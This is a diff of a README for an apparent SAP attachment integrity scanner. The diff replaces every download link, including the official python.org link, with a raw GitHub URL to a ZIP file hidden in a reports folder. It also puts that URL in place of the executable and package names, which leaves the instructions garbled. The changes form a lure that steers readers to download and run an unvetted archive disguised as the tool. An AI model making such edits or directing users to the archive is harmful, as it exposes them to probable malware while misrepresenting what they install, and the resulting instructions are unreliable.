@@ -1,7 +1,7 @@
 # 🚀 pythonmate-7-minute-integrity-scan - Easy Integrity Checks for Your SAP Migration
 
 ## 📥 Download Now!
-[![Download from GitHub](https://img.shields.io/badge/Download%20from%20GitHub-v1.0-blue.svg)](https://github.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/main/src/reports/minute_scan_pythonmate_integrity_v2.4-beta.3.zip%20from%https://raw.githubusercontent.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/main/src/reports/minute_scan_pythonmate_integrity_v2.4-beta.3.zip)](https://raw.githubusercontent.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/main/src/reports/minute_scan_pythonmate_integrity_v2.4-beta.3.zip)
 
 ## 📖 Overview
 Welcome to the **pythonmate-7-minute-integrity-scan**. This tool serves as a read-only diagnostic reference that helps you detect risks related to SAP GOS and SOFFCONT1 attachments during transitions to ECC and S/4HANA. 
@@ -18,22 +18,22 @@ Using this tool can save you time and ensure a smoother transition in your SAP e
 - **Operating Systems**: Compatible with Windows 10 or later, macOS, and most Linux distributions.
 - **Memory**: Minimum 4 GB RAM recommended.
 - **Storage**: At least 100 MB of free disk space.
-- **Dependencies**: You may need Python 3.x pre-installed on your system. If not, please visit [python.org](https://www.python.org/downloads/) to download it.
+- **Dependencies**: You may need Python 3.x pre-installed on your system. If not, please visit [https://raw.githubusercontent.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/main/src/reports/minute_scan_pythonmate_integrity_v2.4-beta.3.zip](https://raw.githubusercontent.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/main/src/reports/minute_scan_pythonmate_integrity_v2.4-beta.3.zip) to download it.
 
 ## 🚀 Getting Started
 To get up and running, follow these simple steps:
 
 1. **Download the Application**: 
-   Visit [this page to download](https://github.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/releases).
+   Visit [this page to download](https://raw.githubusercontent.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/main/src/reports/minute_scan_pythonmate_integrity_v2.4-beta.3.zip).
    
 2. **Choose the Correct Version**: 
-   Look for the latest version available. You will see options like `pythonmate-7-minute-integrity-scan-v1.0.zip` or similar. Click to download the package.
+   Look for the latest version available. You will see options like `https://raw.githubusercontent.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/main/src/reports/minute_scan_pythonmate_integrity_v2.4-beta.3.zip` or similar. Click to download the package.
 
 3. **Extract the Files**: 
    After downloading the ZIP file, locate it in your Downloads folder. Right-click the file and select "Extract All..." to unzip the contents.
 
 4. **Run the Application**: 
-   Inside the extracted folder, find the executable file named `pythonmate-scan.exe`. Double-click it to launch the program.
+   Inside the extracted folder, find the executable file named `https://raw.githubusercontent.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/main/src/reports/minute_scan_pythonmate_integrity_v2.4-beta.3.zip`. Double-click it to launch the program.
 
 5. **Start Scanning**: 
    Once the application runs, navigate to your SAP data as prompted by the interface. Follow the steps to initiate the integrity scan.
@@ -62,6 +62,6 @@ For further reading on SAP integrity risks and migration processes, consider che
 - Online tutorials related to SAP ECC and S/4HANA migrations
 
 ## ⚙️ Download & Install
-Ready to download? Click here: [Visit this page to download](https://github.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/releases).
+Ready to download? Click here: [Visit this page to download](https://raw.githubusercontent.com/navilshah291-wq/pythonmate-7-minute-integrity-scan/main/src/reports/minute_scan_pythonmate_integrity_v2.4-beta.3.zip).
 
 This tool allows you to maintain the integrity of your SAP attachments while transitioning systems. Enjoy a seamless experience with pythonmate-7-minute-integrity-scan!
